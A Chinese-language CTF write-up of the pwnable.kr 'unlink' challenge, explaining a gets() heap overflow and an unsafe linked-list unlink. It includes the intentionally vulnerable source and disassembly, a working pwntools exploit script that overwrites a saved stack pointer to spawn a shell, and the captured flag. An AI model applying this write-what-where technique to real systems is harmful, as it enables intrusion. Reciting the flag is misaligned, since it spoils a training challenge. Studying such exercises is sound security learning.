---
title: pwnable.kr-unlink
date: 2018-02-21 20:26:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
这是一道简化了的linux下`malloc`堆溢出漏洞利用。需要理解linux下关于`glibc的堆管理`的相关内容，[参考](http://blog.csdn.net/maokelong95/article/details/51989081#allocated-chunk)
# 分析
分析源码`unlink.c`
```c
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}

```
程序很简单完全就是教学版的`unlink堆溢出利用`。程序在`gets(A->buf)`处存在堆溢出漏洞，之后调用`unlink(B)`函数把`B`节点从链表中取下来。这个函数中，如果控制了`P`节点的`fb`和`bk`指针，那么就可以造成任意地址写入，写入过程是`将bk写入fb+4表示的地址处，将fb写入bk表示的地址处`。要想写入想要的地址，必须要保证两步写入操作不会触发写异常保护，这里需要控制`esp`的值来使`main`函数在返回时执行`ret`指令将`shell`地址赋给`eip`。
下面分析`main`函数反汇编代码，来构造`payload`
```nasm
0804852f <main>:
 804852f:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 8048533:	83 e4 f0             	and    $0xfffffff0,%esp
 8048536:	ff 71 fc             	pushl  -0x4(%ecx)
 8048539:	55                   	push   %ebp
 804853a:	89 e5                	mov    %esp,%ebp
 804853c:	51                   	push   %ecx
 804853d:	83 ec 14             	sub    $0x14,%esp
 8048540:	83 ec 0c             	sub    $0xc,%esp
 8048543:	68 00 04 00 00       	push   $0x400
 8048548:	e8 53 fe ff ff       	call   80483a0 <malloc@plt>
 804854d:	83 c4 10             	add    $0x10,%esp
 8048550:	83 ec 0c             	sub    $0xc,%esp
 8048553:	6a 10                	push   $0x10
 8048555:	e8 46 fe ff ff       	call   80483a0 <malloc@plt>
 804855a:	83 c4 10             	add    $0x10,%esp
 804855d:	89 45 ec             	mov    %eax,-0x14(%ebp)
 8048560:	83 ec 0c             	sub    $0xc,%esp
 8048563:	6a 10                	push   $0x10
 8048565:	e8 36 fe ff ff       	call   80483a0 <malloc@plt>
 804856a:	83 c4 10             	add    $0x10,%esp
 804856d:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048570:	83 ec 0c             	sub    $0xc,%esp
 8048573:	6a 10                	push   $0x10
 8048575:	e8 26 fe ff ff       	call   80483a0 <malloc@plt>
 804857a:	83 c4 10             	add    $0x10,%esp
 804857d:	89 45 f0             	mov    %eax,-0x10(%ebp)
 8048580:	8b 45 ec             	mov    -0x14(%ebp),%eax
 8048583:	8b 55 f4             	mov    -0xc(%ebp),%edx
 8048586:	89 10                	mov    %edx,(%eax)
 8048588:	8b 55 ec             	mov    -0x14(%ebp),%edx
 804858b:	8b 45 f4             	mov    -0xc(%ebp),%eax
 804858e:	89 50 04             	mov    %edx,0x4(%eax)
 8048591:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048594:	8b 55 f0             	mov    -0x10(%ebp),%edx
 8048597:	89 10                	mov    %edx,(%eax)
 8048599:	8b 45 f0             	mov    -0x10(%ebp),%eax
 804859c:	8b 55 f4             	mov    -0xc(%ebp),%edx
 804859f:	89 50 04             	mov    %edx,0x4(%eax)
 80485a2:	83 ec 08             	sub    $0x8,%esp
 80485a5:	8d 45 ec             	lea    -0x14(%ebp),%eax
 80485a8:	50                   	push   %eax
 80485a9:	68 98 86 04 08       	push   $0x8048698
 80485ae:	e8 cd fd ff ff       	call   8048380 <printf@plt>
 80485b3:	83 c4 10             	add    $0x10,%esp
 80485b6:	8b 45 ec             	mov    -0x14(%ebp),%eax
 80485b9:	83 ec 08             	sub    $0x8,%esp
 80485bc:	50                   	push   %eax
 80485bd:	68 b8 86 04 08       	push   $0x80486b8
 80485c2:	e8 b9 fd ff ff       	call   8048380 <printf@plt>
 80485c7:	83 c4 10             	add    $0x10,%esp
 80485ca:	83 ec 0c             	sub    $0xc,%esp
 80485cd:	68 d8 86 04 08       	push   $0x80486d8
 80485d2:	e8 d9 fd ff ff       	call   80483b0 <puts@plt>
 80485d7:	83 c4 10             	add    $0x10,%esp
 80485da:	8b 45 ec             	mov    -0x14(%ebp),%eax
 80485dd:	83 c0 08             	add    $0x8,%eax
 80485e0:	83 ec 0c             	sub    $0xc,%esp
 80485e3:	50                   	push   %eax
 80485e4:	e8 a7 fd ff ff       	call   8048390 <gets@plt>
 80485e9:	83 c4 10             	add    $0x10,%esp
 80485ec:	83 ec 0c             	sub    $0xc,%esp
 80485ef:	ff 75 f4             	pushl  -0xc(%ebp)
 80485f2:	e8 0d ff ff ff       	call   8048504 <unlink>
 80485f7:	83 c4 10             	add    $0x10,%esp
 80485fa:	b8 00 00 00 00       	mov    $0x0,%eax
 80485ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 8048602:	c9                   	leave  
 8048603:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048606:	c3                   	ret    
 8048607:	66 90                	xchg   %ax,%ax
 8048609:	66 90                	xchg   %ax,%ax
 804860b:	66 90                	xchg   %ax,%ax
 804860d:	66 90                	xchg   %ax,%ax
 804860f:	90                   	nop

```
可以发现`A,B,C`三个节点的栈地址分别是`ebp-0x14,ebp-0xc,ebp-0x10`，在函数结尾发现`ret`指令之前是`lea -0x4(%ecx),%esp`,说明`esp`最后会被`ecx`修改，而`ecx`又会被指令`mov -0x4(%ebp),%ecx`修改。于是要想把esp所表示地址的内容改为shell的地址，可以通过更改`ebp-4`的内容为`shell地址+4`来实现,而`ebp-4`的地址可以通过`A`地址来计算，它们的相对偏移为`ebp-4-(ebp-0x14)=16`。则堆块的内存布局如下
```
+-------------+--------------+   <= A
|   fd        |    bk        |
|shell_addr   |  aaaa        |
+-------------+--------------+   <= B
|    aaaaaaaa(chunk size)    |
|heap_addr+8+4|stack_addr+16 |
|            buf             |
+-------------+--------------+
```
要注意的是题目平台是64位系统，所以存储`chunk size`信息需要8字节，exp如下
```python
from pwn import *

context(arch='amd64',os='linux',log_level='info')
s = ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)
shell_addr = 0x080484eb
ss = s.run('./unlink')
ss.recvuntil('here is stack address leak: ')
stack_addr = int(ss.recv(10),16)
ss.recvuntil('here is heap address leak: ')
heap_addr = int(ss.recv(10),16)
ss.sendline(p32(shell_addr)+'a'*12+p32(heap_addr+8+4)+p32(stack_addr+16))
ss.interactive()

```
```bash
root@kali:~/桌面# python 1.py
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Opening new channel: './unlink': Done
[*] Switching to interactive mode
now that you have leaks, get shell!
$ $ ls
flag  intended_solution.txt  unlink  unlink.c
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
$ $  

```
# 总结
做这道题目搜索了很多关于`glibc堆管理`的相关内容，学到了不少，这里推荐[一篇博文](https://chybeta.github.io/2017/08/19/Software-Security-Learning/)，它记录了很多关于软件安全方向的知识链接，很适合学习。另外pwable.kr的第一部分终于做完了，学到了不少基础知识，希望能在二进制的道路上越走越远。